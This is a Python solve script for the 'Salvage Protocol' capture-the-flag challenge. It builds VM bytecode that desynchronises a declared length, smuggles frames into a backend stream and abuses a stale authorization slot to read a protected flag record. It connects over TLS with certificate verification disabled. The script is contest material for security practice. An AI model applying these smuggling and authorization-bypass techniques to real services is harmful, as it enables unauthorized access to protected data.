#!/usr/bin/env python3
"""Exploit z0d1akCTF 2026 Qualifiers: Salvage Protocol."""

from __future__ import annotations

import argparse
import re
import socket
import ssl
import struct
from pathlib import Path


DEFAULT_HOST = "salvage-protocol-09b2e247a60b.chals.z0d1ak.org"
DEFAULT_PORT = 1337
FLAG_PATTERN = re.compile(rb"zdk\{[^}\r\n]+\}")

OP_HALT = 0x00
OP_RESET = 0x01
OP_SET_DECLARED_LENGTH = 0x10
OP_APPEND_BYTE = 0x11
OP_SET_PAYLOAD = 0x20
OP_EXECUTE = 0x30


def vault_frame(mode: int, path: bytes, payload: bytes = b"") -> bytes:
    """Encode one reclaimd-to-vaultd frame."""
    if not 0 <= mode <= 0xFF:
        raise ValueError("mode does not fit in one byte")
    if len(path) > 0x100:
        raise ValueError("path exceeds vaultd's 256-byte limit")
    if len(payload) > 0x1000:
        raise ValueError("payload exceeds vaultd's 4096-byte limit")
    return (
        bytes([mode])
        + struct.pack(">H", len(path))
        + path
        + struct.pack(">H", len(payload))
        + payload
    )


def build_injected_frames() -> bytes:
    """Build the two frames smuggled after the zero-length wrapper."""
    path = b"vault/flag"

    # Mode 3 resolves the record and sets the authorization slot before it
    # checks this 0x400-byte clearance payload. The remote token is random, so
    # this request returns "denied" while leaving the slot primed.
    bogus_clearance = b"MOJO" + b"\x00" * (0x400 - 4)
    prime_authorization = vault_frame(3, path, bogus_clearance)

    # Mode 2 sees the stale authorization slot and releases the protected data.
    read_protected_record = vault_frame(2, path)
    injected = prime_authorization + read_protected_record
    assert len(injected) == 1054
    return injected


def build_private_stream(injected: bytes) -> bytes:
    """Reconstruct the exact desynchronized stream received by vaultd."""
    zero_length_list_wrapper = b"\x01\x00\x00\x00\x00"
    private_stream = zero_length_list_wrapper + injected
    assert len(private_stream) == 1059
    return private_stream


def build_program(injected: bytes) -> bytes:
    """Encode the injected frames as a reclaimd VM program."""
    # OP_SET_PAYLOAD has an 8-bit length. Seed the first 255 bytes, then append
    # the remaining bytes individually without changing the declared length.
    first, rest = injected[:0xFF], injected[0xFF:]
    program = bytearray([OP_RESET, OP_SET_PAYLOAD, len(first)])
    program.extend(first)
    for value in rest:
        program.extend((OP_APPEND_BYTE, value))

    # This field is written into the inner frame, even though reclaimd still
    # sends every byte in its actual payload buffer.
    program.extend((OP_SET_DECLARED_LENGTH, 0x00, 0x00))
    program.extend((OP_EXECUTE, OP_HALT))
    assert len(program) == 1861
    return bytes(program)


def build_wire_request(program: bytes) -> bytes:
    """Prefix the bytecode with the public four-byte big-endian length."""
    if len(program) > 8192:
        raise ValueError("program exceeds reclaimd's public input limit")
    return struct.pack(">I", len(program)) + program


def recv_exact(sock: socket.socket, size: int) -> bytes:
    data = bytearray()
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            raise EOFError(f"connection closed after {len(data)} of {size} bytes")
        data.extend(chunk)
    return bytes(data)


def send_request(host: str, port: int, request: bytes, timeout: float) -> bytes:
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    with socket.create_connection((host, port), timeout=timeout) as raw:
        with context.wrap_socket(raw, server_hostname=host) as sock:
            sock.sendall(request)
            response_size = struct.unpack(">I", recv_exact(sock, 4))[0]
            if response_size > 0x10000:
                raise ValueError(f"implausible response length: {response_size}")
            return recv_exact(sock, response_size)


def save_artifacts(
    directory: Path,
    injected: bytes,
    private_stream: bytes,
    program: bytes,
    request: bytes,
    response: bytes | None = None,
) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / "injected-frames.bin").write_bytes(injected)
    (directory / "vault-wire.bin").write_bytes(private_stream)
    (directory / "program.bin").write_bytes(program)
    (directory / "request.bin").write_bytes(request)
    if response is not None:
        (directory / "response.txt").write_bytes(response)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST)
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT)
    parser.add_argument("--timeout", type=float, default=10.0)
    parser.add_argument(
        "--dump-dir",
        type=Path,
        help="write the inner frames, VM program, wire request, and response",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="build artifacts without connecting to the challenge service",
    )
    args = parser.parse_args()

    injected = build_injected_frames()
    private_stream = build_private_stream(injected)
    program = build_program(injected)
    request = build_wire_request(program)

    print(f"[+] injected vault frames: {len(injected)} bytes")
    print(f"[+] private vault stream:  {len(private_stream)} bytes")
    print(f"[+] reclaimd VM program:   {len(program)} bytes")
    print(f"[+] public wire request:   {len(request)} bytes")

    if args.dry_run:
        if args.dump_dir:
            save_artifacts(args.dump_dir, injected, private_stream, program, request)
            print(f"[+] wrote exploit artifacts to {args.dump_dir}")
        return 0

    print(f"[+] connecting to {args.host}:{args.port} with TLS")
    response = send_request(args.host, args.port, request, args.timeout)
    print(response.decode("utf-8", errors="replace"), end="")

    if args.dump_dir:
        save_artifacts(
            args.dump_dir,
            injected,
            private_stream,
            program,
            request,
            response,
        )
        print(f"[+] wrote exploit artifacts to {args.dump_dir}")

    match = FLAG_PATTERN.search(response)
    if not match:
        print("[-] response did not contain a flag")
        return 1
    print(f"[+] flag: {match.group().decode()}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
